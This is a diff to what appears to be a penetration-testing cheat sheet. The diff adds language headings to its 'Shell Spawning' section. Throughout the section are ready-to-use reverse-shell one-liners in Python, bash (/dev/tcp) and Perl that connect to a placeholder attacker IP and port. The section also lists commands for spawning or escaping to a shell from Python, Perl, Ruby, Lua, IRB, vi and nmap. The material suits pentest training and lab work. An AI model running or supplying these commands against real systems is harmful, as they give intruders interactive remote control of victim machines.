@@ -408,9 +408,13 @@ Metasploit handlers can be great at quickly setting up Metasploit to be in a pos
 
 # Shell Spawning
 
+<b>Python:</b>
+
 	python -c 'import pty; pty.spawn("/bin/sh")'
 	
 	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<[IP]>",<[PORT]>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+	
+<b>Bash:</b>
 	
 	echo os.system('/bin/bash')
 	
@@ -418,23 +422,37 @@ Metasploit handlers can be great at quickly setting up Metasploit to be in a pos
 	
 	exec 5<>/dev/tcp/<[IP]>/<[PORT]> cat <&5 | while read line; do $line 2>&5 >&5; done
 	
+<b>Perl:</b>
+	
 	perl —e 'exec "/bin/sh";'
 	
 	perl: exec "/bin/sh";
 	
 	perl -e 'use Socket;$i="<[IP]>";$p=<[PORT]>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 	
+<b>Ruby:</b>
+	
 	ruby: exec "/bin/sh"
 	
+<b>Lua:</b>
+	
 	lua: os.execute('/bin/sh')
+
+<b>From within IRB:</b>
 	
-	(From within IRB) exec "/bin/sh"
+	exec "/bin/sh"
 	
-	(From within vi) :!bash
+<B>From within vi:</B>
 	
-	(From within vi) :set shell=/bin/bash:shell
+	:!bash
 	
-	(From within nmap) !sh
+<B>From within vi:</B>
+
+	:set shell=/bin/bash:shell
+	
+<B>From within nmap:</B>
+	
+	!sh
 
 
 
